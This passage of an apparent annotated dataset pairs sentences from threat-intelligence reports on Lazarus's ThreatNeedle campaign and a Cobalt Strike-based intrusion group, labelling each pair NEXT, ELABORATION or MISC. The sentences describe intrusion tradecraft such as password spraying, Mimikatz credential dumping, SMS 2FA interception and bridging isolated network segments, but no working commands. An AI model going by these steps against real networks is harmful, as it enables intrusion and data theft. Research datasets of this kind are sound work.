        "S1": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "S2": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "relation": "MISC"
    },
    {
        "S1": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "S2": "Eventually, the ThreatNeedle malware spawns in memory.",
        "relation": "NEXT"
    },
    {
        "S1": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "S2": "Eventually, the ThreatNeedle malware spawns in memory.",
        "relation": "NEXT"
    },
    {
        "S1": "Eventually, the ThreatNeedle malware spawns in memory.",
        "S2": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "relation": "NEXT"
    },
    {
        "S1": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "S2": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "S2": "Lazarus overcame network segmentation, exfiltrating data from a completely isolated network segment cut off from the internet by compromising a router virtual machine, as we explain below under \u201cOvercoming network segmentation\u201c.",
        "relation": "MISC"
    },
    {
        "S1": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "S2": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "relation": "MISC"
    },
    {
        "S1": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "S2": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "relation": "MISC"
    },
    {
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "relation": "MISC"
    },
    {
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "Typical lateral movement methods were employed, using Windows commands.",
        "relation": "MISC"
    },
    {
        "S1": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "S2": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "relation": "NEXT"
    },
    {
        "S1": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "S2": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "relation": "MISC"
    },
    {
        "S1": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "S2": "Below is a rough timeline of the compromise we investigated:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "S2": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "relation": "MISC"
    },
    {
        "S1": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "S2": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.",
        "relation": "MISC"
    },
    {
        "S1": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "S2": "New connection layout after attacker\u2019s intrusion",
        "relation": "MISC"
    },
    {
        "S1": "One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:",
        "S2": "Several days later, the attacker started to move laterally originating from this host.",
        "relation": "NEXT"
    },
    {
        "S1": "Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.",
        "S2": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "relation": "MISC"
    },
    {
        "S1": "After acquiring the login credentials, the actor started to move laterally from workstations to server hosts.",
        "S2": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).",
        "S2": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "relation": "MISC"
    },
    {
        "S1": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "S2": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data.",
        "S2": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.",
        "relation": "MISC"
    },
    {
        "S1": "The enterprise network under attack was divided into two segments: corporate (a network on which computers had internet access) and restricted (a network on which computers hosted sensitive data and had no internet access).",
        "S2": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In other words, the two segments were meant to be completely separated.",
        "S2": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "S2": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "S2": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "S2": "However, since directly routing traffic between the segments was not possible, the attackers couldn\u2019t use their standard malware set to exfiltrate data from the restricted segment to the C2.",
        "relation": "MISC"
    },
    {
        "S1": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "S2": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "relation": "NEXT"
    },
    {
        "S1": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "S2": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "relation": "NEXT"
    },
    {
        "S1": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "S2": "It\u2019s unknown how the attackers were able to obtain the credentials for that account, but it\u2019s possible the credentials were saved in one of the infected system\u2019s browser password managers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "S2": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "relation": "NEXT"
    },
    {
        "S1": "Several days after that, on July 10, 2020, the attackers connected to the router via SSH and set up the PuTTy PSCP (the PuTTY Secure Copy client) utility on one of the infected machines.",
        "S2": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "relation": "NEXT"
    },
    {
        "S1": "This utility was used to upload malware to the router VM.",
        "S2": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "relation": "NEXT"
    },
    {
        "S1": "This utility was used to upload malware to the router VM.",
        "S2": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "relation": "NEXT"
    },
    {
        "S1": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "S2": "New connection layout after attacker\u2019s intrusion",
        "relation": "MISC"
    },
    {
        "S1": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "S2": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "S2": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "relation": "NEXT"
    },
    {
        "S1": "New connection layout after attacker\u2019s intrusion",
        "S2": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "relation": "MISC"
    },
    {
        "S1": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.",
        "S2": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "relation": "MISC"
    },
    {
        "S1": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "S2": "On September 27, the attackers started removing all traces of their activity from the router, using the logrotate utility to set up automatic deletion of log files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "S2": "According to our telemetry, the actor executed this application with six parameters:",
        "relation": "MISC"
    },
    {
        "S1": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "S2": "The tool offers basic functionality, forwarding client traffic to the server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used a custom tunneling tool to achieve this.",
        "S2": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The tool offers basic functionality, forwarding client traffic to the server.",
        "S2": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "S2": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.",
        "relation": "MISC"
    },
    {
        "S1": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "S2": "According to our telemetry, the actor executed this application with six parameters:",
        "relation": "MISC"
    },
    {
        "S1": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "S2": "The payload opens a given file (in this example %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it to the remote server.",
        "relation": "MISC"
    },
    {
        "S1": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.",
        "S2": "However, if this application is executed with specific command line parameters, it runs an alternate, malicious function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When the parameter checking procedure has passed successfully, the malware starts to decrypt its next payload.",
        "S2": "The malware can accept more command line arguments, and depending on its number it runs differently.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Next, the XORed blob receives the second command line argument that\u2019s provided (in this case S0RMM-50QQE-F65DN-DCPYN-5QEQA).",
        "S2": "When the decrypted in-memory payload is executed, it compares the header of the configuration data passed with the string \u201c0x8406\u201d in order to confirm its validity.",
        "relation": "MISC"
    },
    {
        "S1": "For example, it can also receive proxy server addresses with the \u201c-p\u201d option.",
        "S2": "When the malware uploads data to the C2 server, it uses HTTP POST requests with two parameters named \u2018fr\u2019 and \u2018fp\u2019:",
        "relation": "MISC"
    },
    {
        "S1": "In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.",
        "S2": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.",
        "S2": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "relation": "MISC"
    },
    {
        "S1": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "S2": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "relation": "NEXT"
    },
    {
        "S1": "These credentials are used in a credential stuffing or password spraying attack against the victim\u2019s remote services, such as webmail or other internet reachable mail services.",
        "S2": "Hashes of these files are listed at the end of this article.",
        "relation": "MISC"
    },
    {
        "S1": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "S2": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "relation": "NEXT"
    },
    {
        "S1": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "S2": "Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.",
        "relation": "NEXT"
    },
    {
        "S1": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "S2": "As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.",
        "relation": "NEXT"
    },
    {
        "S1": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "S2": "Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "S2": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "relation": "NEXT"
    },
    {
        "S1": "With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",
        "S2": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "relation": "NEXT"
    },
    {
        "S1": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "S2": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "S2": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "S2": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "S2": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "relation": "NEXT"
    },
    {
        "S1": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "S2": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "relation": "NEXT"
    },
    {
        "S1": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "S2": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "If the victim\u2019s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",
        "S2": "During this process, the adversary identifies data of interest from the network of the victim.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During this process, the adversary identifies data of interest from the network of the victim.",
        "S2": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "relation": "NEXT"
    },
    {
        "S1": "During this process, the adversary identifies data of interest from the network of the victim.",
        "S2": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "relation": "NEXT"
    },
    {
        "S1": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": "MISC"
    },
    {
        "S1": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "S2": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "relation": "MISC"
    },
    {
        "S1": "But this isn\u2019t done consistently across their engagements.",
        "S2": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "relation": "MISC"
    },
    {
        "S1": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "S2": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "relation": "MISC"
    },
    {
        "S1": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "S2": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "relation": "MISC"
    },
    {
        "S1": "The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": "MISC"
    },
    {
        "S1": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "S2": "The actor specifies the following arguments when running the exfiltration tool:",
        "relation": "MISC"
    },
    {
        "S1": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "S2": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "S2": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "relation": "MISC"
    },
    {
        "S1": "They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.",
        "S2": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": "MISC"
    },
    {
        "S1": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "S2": "NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser\u2019s language settings used during the authentication flow.",
        "relation": "MISC"
    },
    {
        "S1": "In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": "NEXT"
    },
    {
        "S1": "In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.",
        "S2": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "relation": "NEXT"
    },
    {
        "S1": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "S2": "From this portal it was possible to launch the web-based VPN.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "S2": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "relation": "NEXT"
    },
    {
        "S1": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "S2": "The adversary used this opportunity to configure an alternate phone number controlled by the adversary.",
        "relation": "NEXT"
    },
    {
        "S1": "From this portal it was possible to launch the web-based VPN.",
        "S2": "It was possible to configure an alternate phone number for the logged in user account at the company portal.",
        "relation": "MISC"
    },
    {
        "S1": "The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account\u2019s primary or alternate phone number.",
        "S2": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "relation": "ELABORATION"
    },
    {
        "S1": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "S2": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "relation": "MISC"
    },
    {
        "S1": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "S2": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "S2": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "relation": "MISC"
    },
    {
        "S1": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "S2": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "relation": "NEXT"
    },
    {
        "S1": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "S2": "But first: How did they get the tools on the victim\u2019s systems?",
        "relation": "MISC"
    },
    {
        "S1": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:",
        "S2": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "relation": "MISC"
    },
    {
        "S1": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "S2": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "S2": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "S2": "Note: the adversary renamed ntdsaudit.exe to msadcs.exe.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command:",
        "S2": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "relation": "ELABORATION"
    },
    {
        "S1": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "S2": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "S2": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "relation": "ELABORATION"
    },
    {
        "S1": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "S2": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "relation": "MISC"
    },
    {
        "S1": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "S2": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "relation": "ELABORATION"
    },
    {
        "S1": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "S2": "It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.",
        "relation": "MISC"
    },
    {
        "S1": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "S2": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary installs a hackers best friend during the intrusion: Cobalt Strike.",
        "S2": "At least the following three versions of Cobalt Strike have been in use by the adversary:",
        "relation": "ELABORATION"
    },
    {
        "S1": "At least the following three versions of Cobalt Strike have been in use by the adversary:",
        "S2": "The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.",
        "relation": "MISC"
    },
    {
        "S1": "Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.",
        "S2": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog \u201cIdentifying Cobalt Strike team servers in the wild\u201d.",
        "S2": "Because of this, historic information was available during this investigation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "S2": "Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.",
        "S2": "The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.",
        "relation": "MISC"
    },
    {
        "S1": "An example of the creation of such a scheduled task by the adversary:",
        "S2": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "relation": "NEXT"
    },
    {
        "S1": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "S2": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "relation": "NEXT"
    },
    {
        "S1": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "S2": "The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "S2": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "relation": "MISC"
    },
    {
        "S1": "We haven\u2019t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.",
        "S2": "After the first bulk of data is exfiltrated, the persistent access into the victim\u2019s network is periodically used by the adversary to check if new data of interest is available.",
        "relation": "NEXT"
    },
    {
        "S1": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "S2": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article.",
        "S2": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "relation": "MISC"
    },
    {
        "S1": "The text files contain the contents of the Security Event log after the specified date.",
        "S2": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "S2": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "relation": "MISC"
    },
    {
        "S1": "A possible intent of the adversary could be to identify if privileged users are active on the systems.",
        "S2": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "S2": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "S2": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.",
        "relation": "MISC"
    },
    {
        "S1": "The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.",
        "S2": "The DLL\u2019s used were side-loaded in memory on compromised systems.",
        "relation": "MISC"
    },
    {
        "S1": "NCC Group and Fox-IT decompiled the tool for analysis.",
        "S2": "Though Fox-IT didn\u2019t find any direct occurrences of the tool on the internet, the decompiled code showed strong similarities with the source code of a tool named GetHttpsInfo.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "S2": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "S2": "We have seen the adversary using SMB, named pipes, PsExec, and WinRM.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike has various methods for deploying its beacons at newly compromised systems.",
        "S2": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "relation": "MISC"
    },
    {
        "S1": "They continue lateral movement and discovery in an attempt to identify the data of interest.",
        "S2": "The adversary was able to find a dual homed system and compromise it.",
        "relation": "NEXT"
    },
    {
        "S1": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "S2": "A few examples of commands we observed:",
        "relation": "MISC"
    },
    {
        "S1": "In one event we saw the adversary compromise a Linux-system through SSH.",
